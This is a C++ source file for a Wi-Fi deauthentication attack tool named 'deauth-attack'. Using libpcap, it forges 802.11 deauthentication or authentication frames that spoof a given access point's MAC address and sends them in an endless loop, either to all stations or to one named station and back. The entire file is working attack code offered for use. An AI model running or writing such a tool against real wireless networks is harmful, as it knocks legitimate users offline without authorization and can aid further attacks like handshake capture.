#include <vector>
#include <cstdlib>
#include <pcap.h>
#include <unistd.h>
#include <stdio.h>
#include "mac.h"

#define ESSID_LEN 32
#define ETHER_ADDR_LEN 6
#define DUM_RTAP_LEN_MINUS_4 4

struct ieee80211_radiotap_header {
    u_int8_t        it_version;     /* set to 0 */
    u_int8_t        it_pad;
    u_int16_t       it_len;         /* entire length */
    u_int32_t       it_present;     /* fields present */
} __attribute__((__packed__));
typedef ieee80211_radiotap_header rthdr;

struct dummy_radiotap_header
{
    u_int16_t it_ver_pad;
    u_int16_t it_len;
    u_int8_t it_dum[DUM_RTAP_LEN_MINUS_4];
}__attribute__((__packed__));
typedef dummy_radiotap_header dumrthdr;

struct ieee80211_mac_header
{
    u_int16_t frame_control;
    u_int16_t duration;
    Mac dmac;
    Mac smac;
    Mac bss;
    u_int16_t seq;
};
typedef ieee80211_mac_header machdr;

struct Wireless
{
    u_int8_t not_use[13];
    u_int8_t ssid_len;
}__attribute__((__packed__));
typedef Wireless wireless;

using namespace std;
pcap_t* pcap;

void printxxd(u_char* arr, int n)
{
    for(int i = 0; i < n; i++)
    {
        printf("%02x ", arr[i]);
    }
}

void printMac(u_int8_t* mac_arr)
{
    for(int i = 0; i < ETHER_ADDR_LEN - 1; i++)
    {
        printf("%02x:", mac_arr[i]);
    }
    printf("%02x", mac_arr[ETHER_ADDR_LEN - 1]);
}

void usage()
{
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int deauth_beam(Mac target, Mac source, Mac bss, u_int16_t type, int isreverse) //type : 0xc000 형식
{
    int pkt_size = sizeof(dumrthdr) + sizeof(machdr) + 6;
    int res;
    u_int8_t* pkt = (u_int8_t*)malloc(pkt_size);
    memset(pkt, 0, pkt_size);
    dumrthdr* rtap = (dumrthdr*)pkt;
    machdr* beacon = (machdr*)(pkt + DUM_RTAP_LEN_MINUS_4 + 4);
    u_int8_t* wless = (u_int8_t*)(pkt + DUM_RTAP_LEN_MINUS_4 + 4 + sizeof(machdr));

    rtap -> it_len = DUM_RTAP_LEN_MINUS_4 + 4;
    beacon -> dmac = target;
    beacon -> smac = source;
    beacon -> bss = bss;
    beacon -> frame_control = type;
    if(type == 0x00c0)
    {
        wless[0] = 0x07;
        wless[1] = 0x00;
        pkt_size -= 4;
    }
    else
    {
        wless[2] = 0x01;
    }
    printxxd((u_char*)pkt, pkt_size);

    while(1)
    {
        res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(pkt), pkt_size);
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            return -1;
        }

        if(isreverse == 1)
        {
            beacon -> smac = target;
            beacon -> dmac = source;
            if(type != 0x00c0)
            {
                wless[2] = 0x02;
            }
            res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(pkt), pkt_size);
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                return -1;
            }
            beacon -> smac = source;
            beacon -> dmac = target;
            if(type != 0x00c0)
            {
                wless[2] = 0x01;
            }
        }

        usleep(50000);
    }
}

int main(int argc, char* argv[]) {
    char *dev = argv[1];
    Mac apmac = Mac(string(argv[2]));
    int rev = 0;
    int isauth = 0;
    int code;
    Mac stationmac = Mac(string("ff:ff:ff:ff:ff:ff"));
    if(argc < 4)
    {
        stationmac = Mac(string("ff:ff:ff:ff:ff:ff"));
    }
    else
    {
        rev = 1;
        stationmac = Mac(string(argv[3]));
    }
    if(argc == 5 && (strcmp(argv[4], "-auth") == 0))
    {
        isauth = 1;
    }
    if(argc < 2 || argc > 5)
    {
        usage();
        return 0;
    }
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return -1;
    }
    const u_char* packet = (u_char*)malloc(BUFSIZ);
    if(packet == NULL)
    {
        fprintf(stderr, "malloc return null\n");
        return -1;
    }
    if(isauth == 0)
    {
        code = 0x00c0;
    }
    else
    {
        code = 0x00b0;
    }
    deauth_beam(stationmac, apmac, apmac, code, rev);
    pcap_close(pcap);
    return 0;
}

